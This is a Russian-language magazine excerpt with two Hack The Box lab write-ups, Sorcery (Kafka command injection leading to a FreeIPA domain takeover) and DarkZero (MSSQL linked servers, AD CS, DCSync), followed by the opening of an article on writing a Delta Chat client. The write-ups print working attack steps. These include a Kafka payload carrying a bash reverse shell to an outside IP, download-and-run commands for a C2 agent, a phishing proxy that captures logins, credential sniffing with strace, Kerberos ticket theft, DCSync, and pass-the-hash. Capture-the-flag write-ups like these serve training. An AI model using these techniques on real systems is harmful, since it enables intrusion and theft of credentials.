                   ← НАЧАЛО СТАТЬИHACK THE BOX
        HTB SORCERY
          ЗАХВАТЫВАЕМ ДОМЕН FREEIPA




Apache Kafka — распределенная платформа для потоковой обработки и хра‐
нения событий. В Kafka несколько ключевых компонентов:
 • Producer — приложение, которое отправляет сообщения в Kafka;
 • Consumer — приложение, которое читает сообщения из Kafka;
 • Broker — сервер Kafka, который хранит данные и обрабатывает запросы;
 • Topic — именованная очередь, в которую Producer пишет, а Consumer
   читает сообщения.

В  исходниках  приложения находим  функцию, которая  получает  данные
из Kafka и затем обрабатывает их. Приложение использует топик update
для получения сообщений. Затем они передаются в команду Bash, которая
выполняется на сервере.





                       Содержимое файла main.rs

С помощью ChatGPT я написал функцию, которая формирует бинарный зап‐
рос в формате Kafka Protocol для отправки сообщения в топик. В качестве
сообщения используем reverse shell.


import struct
import zlib


def build_kafka_produce_v0_request(topic: str, message: str) -> str:
    # --- Config ---
    client_id = "cli"
    correlation_id = 1
    required_acks = 1 # -1
    timeout = 5000
    partition = 0


    # --- Encode topic name ---
    topic_bytes = topic.encode()
    topic_name = struct.pack(">h", len(topic_bytes)) + topic_bytes


    # --- Encode message value ---
    value_bytes = message.encode()
    value = struct.pack(">i", len(value_bytes)) + value_bytes
    key = struct.pack(">i", -1)  # null key


    # --- Message body (no CRC) ---
    msg_body = struct.pack(">bb", 0, 0) + key + value


    # --- CRC32 over message body ---
    crc = zlib.crc32(msg_body) & 0xffffffff
    message = struct.pack(">I", crc) + msg_body


    # --- MessageSet ---
    offset = struct.pack(">q", 0)
    message_size = struct.pack(">i", len(message))
    message_set = offset + message_size + message


    # --- Partition data ---
    record_set = struct.pack(">i", len(message_set)) + message_set
    partition_block = struct.pack(">i", partition) + record_set


    # --- Topic data ---
    topic_data = struct.pack(">i", 1) + topic_name + struct.pack(">i"
, 1) + partition_block


    # --- Produce request body ---
    body = struct.pack(">h", required_acks) + struct.pack(">i",
timeout) + topic_data


    # --- Header ---
    client_id_bytes = client_id.encode()
    header = (
        struct.pack(">h", 0) +  # api_key = 0
        struct.pack(">h", 0) +  # api_version = 0
        struct.pack(">i", correlation_id) +
        struct.pack(">h", len(client_id_bytes)) + client_id_bytes
    )


    # --- Full request ---
    full = header + body
    total_len = struct.pack(">i", len(full))
    request = total_len + full


    return request.hex()


req = build_kafka_produce_v0_request("update", "bash -c '/bin/sh -i >
& /dev/tcp/10.10.14.62/5432 0>&1'")
print(req)

Этот код вернет уже закодированные в Hex данные. Запускаем листенер ( nc
-nlvp 4321 ) и отправляем данные через страницу Debug. Сразу получаем
сессию user на своем листенере.





                             Отправка данных Kafka





                         Сессия пользователя user


ПРОДВИЖЕНИЕ

Пользователь tom_summers
Мы попали в контейнер Docker, в котором почти ничего нет, кроме Python 3,
хотя и это уже немало. Для дальнейшей работы будем использовать фрей‐
мворк AdaptixC2 . Создадим листенер mTLS и сгенерируем агент gopher
для Linux.





                             Настройки листенера





                               Настройки агента

На своем хосте запускаем веб‑сервер:


python3 -m http.server

И  скачиваем сгенерированный агент на  удаленный сервер с помощью
python3 .


python3 -c 'import urllib.request; urllib.request.urlretrieve(
"http://10.10.14.62:8000/agent.bin", "/tmp/agent.bin")'

После запуска агента gopher получаем активную сессию и через Browsers →
Remote Terminal переходим в полностью интерактивную оболочку /bin/bash .





                              Активные сессии

В блоге упоминался FTP-сервер, который можно найти, просканировав внут‐
реннюю сеть. Командой upload в консоли агента загружаем на удаленный
хост утилиту Nmap.





                                Загрузка Nmap

Затем в интерактивном терминале сканируем сеть. Так мы находим 11 хос‐
тов, среди которых по именам можно определить нужные нам FTP- и поч‐
товый сервер.


nmap -sn 172.19.0.0/24





                            Результат сканирования сети

Чтобы получить доступ к FTP-серверу, нужно проксировать сетевой трафик.
Для этого через работающий агент создаем туннель SOCKS5 на стороне кли‐
ента AdaptixC2. Созданный туннель появится в таблице Tunnels.





                           Создание клиента





                              Таблица Tunnels

Теперь через созданный туннель с помощью ProxyChains сканируем 21-й
порт FTP-сервера. Как видно из логов Nmap, служба разрешает анонимную
авторизацию, а на сервере доступен каталог ftp.


proxychains -q nmap -p21 -A 172.19.0.11





                           Результат сканирования Nmap

Подключаемся к FTP-серверу и скачиваем корневой сертификат и ключ.


proxychains -q ftp anonymous@172.19.0.11





                        Содержимое FTP-сервера

Теперь просканируем порты почтового сервера, чтобы понять, куда отправ‐
лять фишинговые письма.


nmap -p1-10000 172.19.0.9





                          Результат сканирования портов

Еще одно требование — создать свой поддомен в домене sorcery.htb.
В корневом каталоге есть директория /dns — на сервере работает DNS-сер‐
вер, там лежат несколько файлов и скрипт convert.sh .





                     Содержимое скрипта convert.sh

Скрипт читает файлы hosts и hosts-user и записывает данные в entries ,
где хранятся актуальные DNS-записи. На hosts у нас нет прав, а hosts-user
вообще отсутствует. Создаем его и добавляем адрес своей машины с любым
доменом, например ralf.sorcery.htb.  После  этого  запускаем скрипт
и завершаем процесс dnsmasq . Когда служба перезапустится, на DNS-сер‐
вере появится запись ralf.sorcery.htb.


echo "10.10.14.62 ralf.sorcery.htb" >> hosts-user
./convert.sh
pkill -9 dnsmasq

Теперь создадим сертификат для этой DNS-записи, который будет исполь‐
зоваться для HTTPS, и подпишем его скачанным ранее корневым сертифика‐
том.


openssl genrsa -out ralf.sorcery.htb.key 2048
openssl req -new -key ralf.sorcery.htb.key -out ralf.sorcery.htb.csr
-subj "/CN=ralf.sorcery.htb"
openssl rsa -in RootCA.key -out RootCA.dec.key
openssl x509 -req -in ralf.sorcery.htb.csr -CA RootCA.crt -CAkey
RootCA.dec.key -CAcreateserial -out ralf.sorcery.htb.crt -days 365
cat ralf.sorcery.htb.key ralf.sorcery.htb.crt > ralf.sorcery.htb.pem

Осталось сделать фишинговый ресурс. Вместо копии сайта можно прок‐
сировать  запросы  на  настоящий  git.sorcery.htb  через mitmdump.
Для этой утилиты можно указать Python-скрипт, который будет обрабатывать
запросы. В следующем обработчике mitm.py мы просто выводим все данные
и заголовки запросов к странице /user/login .


import mitmproxy


def response (flow):
    if "/user/login" in flow.request.pretty_url:
        print(f"{flow.request.method} {flow.request.pretty_url} {flow
.request.http_version}")


        for key, value in flow.request.headers.items():
            print(f"{key}: {value}")


        if flow.request.urlencoded_form:
            for key, value in flow.request.urlencoded_form.items():
                print(f"{key}: {value}")
        elif flow.request.text:
            print(flow.request.text)

Запускаем mitmdump , чтобы проксировать запросы с порта 443 к сайту
https://git.sorcery.htb.


mitmdump --mode reverse:https://git.sorcery.htb --certs ralf.sorcery.
htb.pem -p 443 --ssl-insecure -s mitm.py

В  конце  отправим  пользователю tom_summers сообщение со  ссылкой
на https://ralf.sorcery.htb/user/login .


proxychains4 -q swaks --to tom_summers@sorcery.htb --from
admin@sorcery.htb --server 172.19.0.9 --port 1025 --header "Subject:
New Gitea" --body "New gitea: https://ralf.sorcery.htb/user/login"





                              Отправка сообщения

В логах mitmdump увидим запросы к сайту, а также полный запрос на авто‐
ризацию, в котором передаются учетные данные пользователя tom_summers .





                                 Логи mitmdump

С полученными учетными данными заходим по SSH и забираем первый флаг.





                       Флаг пользователя


Пользователь tom_summers_admin
Теперь нужно собрать информацию. Я буду использовать для этого скрипты
PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить  цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



Загрузим на удаленный хост скрипт для Linux, дадим ему права на выпол‐
нение и запустим сканирование. В выводе много всего, ищем только то, что
нам может пригодиться.
  На хосте есть процесс Xvfb — виртуальный буфер кадра X. А docker-proxy
пробрасывает на хост порт 5000 — типичный для сервиса Docker Registry .





                            Список процессов

На сервере много пользователей с командной оболочкой, а у пользователя
tom_summers есть еще одна учетная запись — tom_summers_admin .





                          Пользователи с консолью

Сейчас на сервере есть сессия пользователя tom_summers_admin .





                              Активные сессии

Этот сервер подключен к домену FreeIPA sorcery.htb.





                              Файлы .ipa

Xvfb — виртуальный X-сервер, который работает в памяти, без физического
дисплея или видеокарты. Он позволяет запускать графические приложения,
которым нужна X-среда, но без вывода на экран. На сервере можно найти
каталог /xorg/xvfb/ , в котором хранится кеш Xvfb.





                        Содержимое каталога xvfb

Скачиваем файл на свою машину и открываем его в графическом редакторе.
В итоге получаем изображение открытого текстового файла с учетными дан‐
ными пользователя tom_summers_admin .


scp tom_summers@10.10.11.73:/xorg/xvfb/Xvfb_screen0 ./





                         Содержимое кеша xvfb

Авторизуемся по SSH с найденными учетными данными.



                 Сессия пользователя tom_summers_admin


Пользователь rebecca_smith
При смене контекста нужно проверить несколько мест, одно из них — нас‐
тройки sudoers. Из них выясняем, что пользователь может выполнить команды
/usr/bin/docker login и /usr/bin/strace -s 128 -p от имени учетной
записи rebecca_smith .


sudo -l




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИHACK THE BOX
        HTB SORCERY
          ЗАХВАТЫВАЕМ ДОМЕН FREEIPA





                               Настройки sudoers

При запуске команды /usr/bin/docker login увидим ошибку чтения файла
/home/rebecca_smith/.docker/creds .





                                Логи docker login

Попробуем отследить, что происходит, когда мы запускаем /usr/bin/docker
login . Для этого воспользуемся утилитой pspy64 , которая показывает про‐
цессы в системе.
   Запускаем pspy64, а затем выполняем sudo /usr/bin/docker login .
В выводе видим, как стартует наша команда, после чего уже от имени
rebecca_smith выполняются /usr/bin/docker login , docker-credential-
docker-auth get и docker-credential-docker-auth store . Похоже, имен‐
но docker-credential-docker-auth обрабатывает полученные учетные дан‐
ные.




                          Вывод утилиты pspy64

Утилита strace нужна для отслеживания системных вызовов, которые выпол‐
няет процесс в Linux. Она полезна для отладки, диагностики и понимания
работы программ, особенно если их исходный код недоступен. Также strace
показывает параметры вызываемых системных функций. Мы можем написать
простой скрипт, который будет подключать strace к процессам docker-
credential-docker-auth, как только они появятся в системе.


while true; do
    PID=$(pidof docker-credential-docker-auth)
    if [ -n "$PID" ]; then
        break
    fi
done


sudo -u rebecca_smith /usr/bin/strace -s 128 -p "$PID"

Теперь в другом терминале запускаем sudo -u rebecca_smith /usr/bin/
docker login и смотрим логи strace.





                                   Логи strace

В функции write находим учетные данные пользователя rebecca_smith и с
их помощью получаем SSH-сессию.



                    Сессия пользователя rebecca_smith


Пользователь donna_adams
Пробуем авторизоваться в docker-registry, но безуспешно.


curl -u 'rebecca_smith' : '-7eAZDp9-f9mg' http://127.0.0.1:5000/v2/



                                 Ответ сервера

В логах strace есть такая строка:


try logging in with <password><otp>

Значит, docker-credential-docker-auth как‑то генерирует OTP. Эта ути‐
лита написана на C# и работает через Mono, так что мы можем декомпилиро‐
вать ее и получить исходный код. Скачиваем утилиту на свою машину и откры‐
ваем в dnSpy .
  В исходном коде находим функцию HandleOtp, которая генерирует токен.
Чтобы сгенерировать OTP, нужно знать seed генератора случайных чисел: он
зависит от текущей минуты и ID пользователя в системе.





                Исходный код docker-credential-docker-auth

Попробуем  сгенерировать  токен и  пройти  аутентификацию  в  сервисе
docker-registry. Сначала узнаем текущее системное время, чтобы понять,
какая сейчас минута.


date



                              Текущее время

Затем меняем генератор так, чтобы получить OTP 699914.


Console.WriteLine(new Random(12 / 10 + (int)2003).Next(100000, 999999
));





                         Код генератора

Быстро выполняем запрос к docker-registry и больше не получаем ошибку
о том, что не авторизованы.


curl -u 'rebecca_smith' : '-7eAZDp9-f9mg699914' http://127.0.0.1:5000/
v2/




                                 Ответ сервера

Для  работы  с  Docker  Registry  можно  использовать  удобную  утилиту
DockerRegistryGrabber . Но пароль пользователя начинается со знака - ,
поэтому парсер аргументов воспринимает его как параметр, а не как зна‐
чение. Немного изменим исходный скрипт: прямо в коде жестко укажем
пароль, а OTP будем передавать как аргумент и просто добавлять к паролю
пользователя.





                          Исходный код drg.py

Получить список образов можно командой --list.


proxychains -q python3 drg.py http://127.0.0.1 -U 'rebecca_smith' -P
'310463' --list



                           Список репозиториев

Теперь дампим все содержимое test-domain-workstation .


proxychains -q python3 drg.py http://127.0.0.1 -U 'rebecca_smith' -P
'780645' --dump test-domain-workstation




               Дамп образа test-domain-workstation

В одном из архивов находим файл docker-entrypoint.sh с командой,
которая настраивает Linux-систему как клиент в домене FreeIPA. В ней есть
логин и пароль.





                 Содержимое файла docker-entrypoint.sh

С полученными учетными данными авторизуемся по SSH.




                    Сессия пользователя donna_adams


ДОМЕН FREEIPA

Пользователь ash_winter
Мы попали в домен FreeIPA, поэтому проведем базовую разведку. Сначала
получим список пользователей домена.


ipa user-find





                        Пользователи домена FreeIPA

В домене всего три пользователя. Запросим полную информацию об учетной
записи donna_adams .


ipa user-show donna_adams --all





                  Полная информация об учетной записи

У donna_adams назначена роль change_userPassword_ash_winter_ldap .
Судя по названию, эта учетная запись может изменить пароль учетной записи
ash_winter через LDAP. Попробуем задать пользователю свой пароль.


ipa user-mod ash_winter --password





                          Изменение пароля

Авторизуемся от имени пользователя ash_winter : система предложит задать
новый пароль, после чего мы получим новую сессию.





                           Подключение по SSH




                      Сессия пользователя ash_winter


Повышение привилегий в домене
Запросим всю информацию об учетной записи ash_winter .


ipa user-show ash_winter --all





                  Полная информация об учетной записи

У ash_winter назначена роль add_sysadmin. Теперь запросим список групп.


group-find





                           Группы домена FreeIPA

В домене есть группа sysadmins, и, судя по названию роли, учетная запись
ash_winter может добавлять в нее других пользователей. Получим всю
информацию о группе sysadmins.


ipa group-show sysadmins --all





                       Полная информация о группе

У sysadmins назначена роль manage_sudorules_ldap . Судя по названию,
участники этой группы могут назначать права sudo , а это путь к высоким при‐
вилегиям. От имени ash_winter добавим себя в группу sysadmins.


ipa group-add-member sysadmins --users=ash_winter





                     Добавление пользователя в группу

Затем даем этой учетной записи права sudo .


ipa sudorule-add-user allow_sudo --users=ash_winter





                          Назначение правила

Настройки sudoers позволяют нам перезапустить демон sssd.


sudo -l




                               Настройки sudoers

Перезапускаем демон SSSD и снова входим на сервер.


sudo /usr/bin/systemctl restart sssd

После повторной проверки sudoers обнаружим полные права на запуск sudo.





                               Настройки sudoers

Переключаемся на пользователя root и читаем последний флаг.





                           Флаг рута

Машина захвачена! © X
HACK THE BOX





Сегодня покажу интересный пример  экс‐
плуатации  связанных  серверов  Microsoft
SQL Server. Мы шаг за шагом пройдем зак‐
репление через агент, извлечение учетных                                                                                         RalfHacker
                                                                                          @RalfHackerChannelданных через AD CS, обход ограничений
и  повышение  привилегий  до  SYSTEM,
а затем увидим, как с помощью доверия
между доменами и DCSync добиться пол‐
ного контроля над инфраструктурой.


Наша  конечная цель — получить  права  суперпользователя на машине
DarkZero с учебной площадки Hack The Box . Уровень задания — сложный.


           WARNING

                            Подключаться к машинам на HTB лучше через
                          средства   анонимизации   и   виртуализации.
                    Не делай этого с компьютеров, где хранятся важ‐
                     ные для тебя данные: ты окажешься в одной сети
                        с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts :


10.10.11.89    darkzero.htb

На этот раз нам предоставляют не только IP-адрес машины, но и учетные дан‐
ные с правами пользователя домена.





                         Информация о машине

Запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг в любой атаке. Оно поз‐
воляет злоумышленнику узнать, какие службы на хосте принимают соеди‐
нения. На основе этой информации он выбирает следующий шаг, чтобы
получить точку входа.
   Самый  известный  инструмент для  сканирования — Nmap.  Улучшить
результаты его работы поможет следующий скрипт:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '
 ' ',' | sed s/, $// )
 nmap -p$ports -A $1


Он работает в два  этапа. Сначала  запускается быстрое сканирование,
затем — более тщательное, с помощью встроенных скриптов (опция -A ).
   Подробнее про работу с Nmap читай в статье « Nmap с самого начала.
Осваиваем разведку и сканирование сети ».





                             Результат работы скрипта

Сканер нашел 11 открытых портов:
 • 88 — Kerberos;
 • 139 — служба сеансов NetBIOS, Netlogon;
 • 389 — LDAP;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется службами DCOM и Microsoft
   Exchange;
 • 636 — LDAP через SSL или TLS;
 • 1433 — Microsoft SQL Server;
 • 3268 (LDAP) — доступ клиента к Global Catalog на контроллере;
 • 3269 (LDAPS) — доступ клиента к Global Catalog на контроллере через
   защищенное соединение;
 • 5985 — WinRM.


ТОЧКА ВХОДА

Проверим полученные учетные данные с помощью NetExec .


nxc smb 10.10.11.89 -u john.w -p 'RFulUtONCOL!'



                           Проверка учетных данных

Получив  список  пользователей и доступные шары, ничего  интересного
не находим, поэтому перейдем к сбору информации о домене с помощью
BloodHound .

Справка: BloodHound
Утилита BloodHound использует теорию графов для выявления скрытых
и зачастую непреднамеренных взаимосвязей в среде Active Directory. Ее мож‐
но использовать, чтобы легко идентифицировать очень сложные пути атаки.
Помимо самой утилиты, которая позволяет просматривать граф, существует
часть, загружаемая на удаленный хост для сбора информации. Она бывает
в версиях для разных ОС и на разных языках программирования.



Собирать данные будем с помощью коллектора RustHound .


./rusthound-ce -d darkzero.htb -u john.w -p 'RFulUtONCOL!' -i 10.10.
11.89 -c All -z --ldaps





                                 Логи RustHound

К сожалению, и тут мы не нашли пути для дальнейшего продвижения. На хосте
работает служба Microsoft SQL Server, попробуем в ней авторизоваться.


nxc mssql 10.10.11.89 -u john.w -p 'RFulUtONCOL!'



                           Проверка учетных данных

Подключаемся к СУБД MS SQL и проверяем список баз данных.


mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!'@10.10.11.89
-windows-auth


enum_db





                            Список баз данных

Никаких пользовательских баз нет, так что проверим, можно ли выполнять
команды в операционной системе.


enable_xp_cmdshell




                    Попытка включения функции xp_cmdshell

И тут тоже неудача. Теперь запросим все связанные серверы. В Microsoft SQL
Server связанные серверы — это объекты, которые позволяют выполнять рас‐
пределенные запросы к другим источникам данных, например к другим
экземплярам SQL Server.


enum_links





                         Связанные серверы MS SQL

Наш сервер MS SQL связан с сервером MS SQL на машине DC02, и на уда‐
ленном сервере текущий пользователь будет работать в контексте учетной
записи dc01_sql_svc. Перейдем на связанный сервер и запросим список
баз данных.


use_link "DC02.darkzero.ext"
enum_db





                        Базы данных на сервере DC02

Теперь включим функцию xp_cmdshell и выполним команду whoami на уда‐
ленном сервере.


enable_xp_cmdshell
xp_cmdshell whoami





                          Результат выполнения команды


ТОЧКА ОПОРЫ

Мы можем выполнять команды на сервере, поэтому попробуем закинуть
какой‑нибудь агент, например Gopher из AdaptixC2.





                    Параметры листенера агента Gopher

Теперь на удаленной системе с помощью curl скачиваем файл со своего сер‐
вера, развернутого командой python3 -m http.server, и запускаем. В таб‐
лице сессий появится агент.


xp_cmdshell "curl 10.10.14.85:8000/agent.exe -o C:\\Windows\\Tasks\\
a.exe"
xp_cmdshell "cmd /c C:\\Windows\\Tasks\\a.exe"





                                 Запуск агента





                          Информация о сессии

Как   показывает  вывод  BOF  whoami,   у   сессии   нет   привилегии
SeImpersonatePrivilege, а значит, нам нужно получить пароль учетной
записи, чтобы запустить новый процесс в обход ограничений UAC. Найдем
в сети сервер AD CS с помощью BOF adcs_enum_com .


execute bof adcs_enum_com.x64.o




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИHACK THE BOX
       HTB DARKZERO
                ЗАХВАТЫВАЕМ ДОМЕН
                    ЧЕРЕЗ СВЯЗАННЫЕ
                    СЕРВЕРЫ MS SQL





                   Информация о центре сертификации

Воспользуемся утилитой Certify , чтобы получить сертификат текущего поль‐
зователя.


execute-assembly ~/tools/SHARP/Certify.exe request --ca DC02 \d
arkzero-ext-DC02-CA --template User





                        Сертификат пользователя

Затем с помощью Rubeus проведем атаку UnPAC the hash и получим NTLM-
хеш пароля владельца сертификата.


execute-assembly ~/tools/SHARP/Rubeus.exe asktgt /getcredentials /
user:svc_sql /certificate:MIAC.....AAAAA==





                   Хеш пароля пользователя

На сайте CrackStation подбираем пароль для этого хеша.




                       Получение пароля пользователя


ПРОДВИЖЕНИЕ

Теперь, когда у нас есть пароль от учетной записи, мы можем с помощью
RunasCs запустить новый процесс с полным токеном.


execute-assembly /tmp/RunasCs.exe svc_sql pa$$w0rd C:\Windows\T asks\a
2.exe -l 5 -b





                       Информация о новой сессии

BOF  whoami  показывает,  что  в  новой  сессии  активна  привилегия
SeImpersonatePrivilege («Олицетворение клиента после проверки под‐
линности»). Как пишет Microsoft:


      Присвоение пользователю права «Олицетворять клиента после про‐
       верки подлинности» разрешает программам, запущенным от имени«
       данного пользователя, олицетворять клиента. Использование данного
      параметра  предотвращает  олицетворение  неавторизованными  сер‐
      верами клиентов, подключающихся к этим серверам с помощью про‐
      цедур RPC или именованных каналов.                »
Другими словами, эта привилегия позволяет имитировать любой токен, дес‐
криптор которого удастся получить. Это очевидный вектор повышения при‐
вилегий, поэтому используем GodPotato , чтобы создать новую сессию
от имени SYSTEM.


execute-assembly /tmp/GodPotato-NET4.exe -cmd C: \Windows\T asks\a .exe





                       Информация о новой сессии

Получив полные права, забираем первый флаг из каталога администратора
и дампим хеш локального администратора на случай, если потеряем доступ.





                       Флаг пользователя





              Хеш пароля локального администратора


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Мы скомпрометировали один домен — найдем доверенные домены и леса.


([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain
()).GetAllTrustRelationships()


([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest
()).GetAllTrustRelationships()





                         Трастовые домены и леса

Есть лес с двусторонним доверием. Используем неограниченное делеги‐
рование, настроенное на контроллере домена, чтобы получить TGT-билет
учетной записи, от имени которой в первом домене  работает  служба
Microsoft SQL Server. Авторизуемся в Microsoft SQL Server и через процедуру
xp_dirtree обратимся к подконтрольному DC02.


mssqlclient.py 'darkzero.htb/john.w:RFulUtONCOL!'@10.10.11.89
-windows-auth


xp_dirtree \\DC02.darkzero.ext\qweasd





                        Обращение к DC02

Сразу в сессии на DC02 дампим билеты пользователя DC01$ .


kerberus dump /user:DC01$





                       Дамп TGT-билета

Учетная запись контроллера домена позволяет реплицировать учетные дан‐
ные объектов домена с помощью DCSync. Конвертируем билет из формата
KIRBI в CCACHE и реплицируем учетные данные администратора.


cat ticket.b64 | base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache


KRB5CCNAME=ticket.ccache faketime -f "+7h" secretsdump.py 'darkzero.
htb/DC01$@dc01.darkzero.htb' -k -no-pass -dc-ip 10.10.11.89
-just-dc-user Administrator





                      Учетные данные администратора

Осталось подключиться по WinRM и забрать второй флаг.


evil-winrm -i 10.10.11.89 -u administrator -H
5917507bdf2ef2c2b0a869a1cba40726





                           Флаг рута

Машина захвачена! © X
ТРЮКИ





Мессенджер без  собственных  серверов,
без номера телефона, без привязки к обла‐
ку — и при этом с end-to-end-шифровани‐
ем из коробки. Delta Chat работает поверх                                                                                             mr.grogrig
                                                                                                 @grogrigsобычной  электронной  почты: сообщения
идут по IMAP и SMTP, но шифруются через
OpenPGP. Снаружи — привычный чат с кон‐
тактами, группами и мгновенной доставкой.
Внутри — нетривиальная связка криптогра‐
фии,  протоколов рукопожатия и  жестких
ограничений на формат пакетов.


БЫСТРЫЙ СТАРТ

Приложение качай с официального сайта — есть версии для Android, iOS,
Windows, macOS и Linux. При первом запуске достаточно ввести имя поль‐
зователя — почтовый аккаунт создастся автоматически на сервере chatmail.
При желании можно подключить собственный аккаунт Gmail или «Яндекса».


СИСТЕМА РЕЛЕЕВ

Изначально Delta Chat задумывался как мессенджер поверх любого поч‐
тового сервера, но на практике это привело к проблемам:
 • спам‑фильтры удаляли зашифрованные сообщения;
 • серверы ограничивали число пересылок в час;
 • серверы собирали метаданные;
 • регистрация требовала номер телефона;
 • при пересылке ломались заголовки.

Вдобавок, если провайдер заблокирует конкретный сервер, ты фактически
лишишься доступа к своему аккаунту. В ответ на эти ограничения появились
relay-серверы.
  По факту релей — это частный почтовый сервер, обычно на базе chatmail .
Любой желающий может арендовать VPS на Linux, купить домен и за считаные
минуты развернуть свой релей.
   Delta Chat поддерживает multi-relay: один аккаунт может иметь несколько
адресов на разных релеях. Собеседник при получении сообщения видит все
твои адреса и отвечает на каждый из них.
   Это соответствует идее федеративного устройства сети — у чата нет еди‐
ной точки отказа. Если публичные серверы станут недоступны, общение про‐
должится через частные релеи.


ПИШЕМ СВОЙ КЛИЕНТ

Вместо того чтобы разбираться в мегабайтах документации, которая часто
расходится с реализацией, я попросил Claude собрать минимально работа‐
ющий клиент на чистом Python, сверяясь с исходниками Delta Chat. Идеаль‐
ная задача для ИИ: исходники открыты, результат легко проверяется — либо
сообщение дошло и расшифровалось, либо нет.
  Для работы нужны два репозитория:
 • deltachat-core-rust — ядро Delta Chat на Rust. Здесь реализована вся крип‐
   тография (через rPGP), протокол SecureJoin, работа с IMAP и SMTP, фор‐
   мат сообщений;
 • chatmail — серверная часть chatmail-релеев. Здесь видно, как сервер
   фильтрует сообщения (filtermail), какие пакеты принимает, а какие откло‐
   няет.

Задача — собрать клиент, у которого есть три функции:
 1. Регистрация — создать аккаунт на chatmail-сервере и сгенерировать
   ключ PGP.
 2. Добавление контакта и отправка — отправить сообщение первым.
 3. Эхо‑бот — принимать входящие сообщения, расшифровывать и отвечать
   на них.

Если все три сценария работают — клиент отправляет, принимает, шифрует
и расшифровывает, — значит, протокол понят верно. После этого разбираем
полученный код вручную.


Регистрация
python -m pydeltachat.tests.register
python -m pydeltachat.tests.register --name "My Bot" --domain nine.
testrun.org

Скрипт создает новый chatmail-аккаунт с ключом PGP, совместимым с Delta
Chat.


Создание аккаунта
По умолчанию используется релей nine.testrun.org. Скрипт генерирует
случайные credentials: 9-символьный username и 50-символьный пароль из [
a-zA-Z0-9] через secrets.choice — криптографически стойкий ГПСЧ.
   Chatmail-серверы реализуют instant onboarding: отдельной регистрации
нет — аккаунт создается автоматически при первом IMAP-логине. Скрипт
подключается к серверу по IMAP4 SSL, выполняет LOGIN — и аккаунт готов.


Генерация ключа PGP
Скрипт генерирует ключ OpenPGP v4, состоящий из двух частей.
   Primary key — Ed25519 (EdDSA). Нужен для цифровых подписей.
Скрипт генерирует 32-байтный случайный seed и вычисляет из него пуб‐
личный ключ на кривой Эдвардса. Ed25519 обеспечивает ~128 бит безопас‐
ности — это сопоставимо с RSA-3072, но ключ занимает всего 32 байта вмес‐
то 384. Подписи детерминированные: один и тот же вход всегда дает одну
и ту же подпись, что исключает атаки через слабый генератор случайных
чисел в момент подписания.
  Subkey — Cv25519 (ECDH). Используется для шифрования. Скрипт
генерирует 32-байтный секрет и вычисляет из него публичную точку на кри‐
вой Curve25519. Когда кто‑то хочет отправить зашифрованное сообщение,
происходит обмен ключами по схеме Диффи — Хеллмана: отправитель
и получатель, не раскрывая своих секретов, вычисляют общий shared secret.
Из него выводится одноразовый симметричный ключ AES-256, которым
и шифруется сообщение.


Сохранение
Скрипт записывает результат в account.json : адрес, пароль, домен, имя,
fingerprint,  приватный и публичный ключ в ASCII armor, публичный ключ
в Base64 (для заголовка Autocrypt). Если файл уже существует — предыдущая
версия сохраняется как account.json.bak.


Добавление контакта и отправка сообщения
python -m pydeltachat.tests.join_and_send --link "{LINK}"

Вот как выглядит реальная ссылка‑инвайт:


https://i.delta.chat/#CF6338985FA826B9A0D32C919C4854012A44C7AA&v=3&
i=YEu6KKX0DT8Iz-4qZBPlWsGO&s=j5G4Ivb5PRQkbhCFEt5khMrZ&
a=zgmor45qk%40nine.testrun.org&n=TestAccount

Это точка входа в протокол SecureJoin:


"fingerprint":   "CF6338985FA826B9A0D32C919C4854012A44C7AA",
"version":       "3"
"invite_number": "YEu6KKX0DT8Iz-4qZBPlWsGO",
"auth_code":     "j5G4Ivb5PRQkbhCFEt5khMrZ",
"addr":          "zgmor45qk@nine.testrun.org",
"name":          "TestAccount",

Ссылка содержит:
 • отпечаток ключа PGP;
 • версию протокола SecureJoin;
 • уникальный номер инвайта;
 • секрет аутентификации  (auth), подтверждающий на шаге 3, что  joiner
   получил ссылку;
 • почтовый адрес инвайтера;
 • отображаемое имя собеседника.


Шаг 1: отправка vc-request
Клиент формирует и отправляет по SMTP сообщение:


Subject: Message from iHC5gr5yV@nine.testrun.org
From: PyDC Bot <iHC5gr5yV@nine.testrun.org>
To: <zgmor45qk@nine.testrun.org>
Date: Fri, 10 Apr 2026 17:37:24 +0400
Message-ID: <3326cb29-d274-42c1-92ab-b519527e044b@pydeltachat>
Chat-Version: 1.0
Secure-Join: vc-request
Secure-Join-Invitenumber: YEu6KKX0DT8Iz-4qZBPlWsGO
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="b-667b5a35d445420c"
Autocrypt: addr=iHC5gr5yV@nine.testrun.org; prefer-encrypt=mutual;
        keydata=xjMEadjHhRYJKwYBBA (...)

Из ссылки берутся addr и invite_number и помещаются в заголовки письма.
Интересно  тут  поле  Autocrypt,  а  конкретно —  значение  keydata .
Под Base64 скрывается бинарный массив из пяти сырых пакетов OpenPGP:
 • Public-Key (primary Ed25519);
 • User ID;
 • Signature (UID self-certification);
 • Public-Subkey (X25519);
 • Signature (subkey binding).

Autocrypt — минимальная надстройка над обычной электронной почтой,
которая позволяет клиентам автоматически шифровать переписку на базе
OpenPGP без ручной работы с ключами.
   Первый пакет — главный, корневой ключ владельца. Он построен на алго‐
ритме Ed25519 и используется только для двух вещей: подписывать сооб‐
щения и сертифицировать (удостоверять) свой почтовый адрес и подключ
шифрования. Вместе с ключом хранится время создания — обычный Unix
timestamp.
   Второй пакет — строка почтового адреса в формате OpenPGP: PyDC Bot
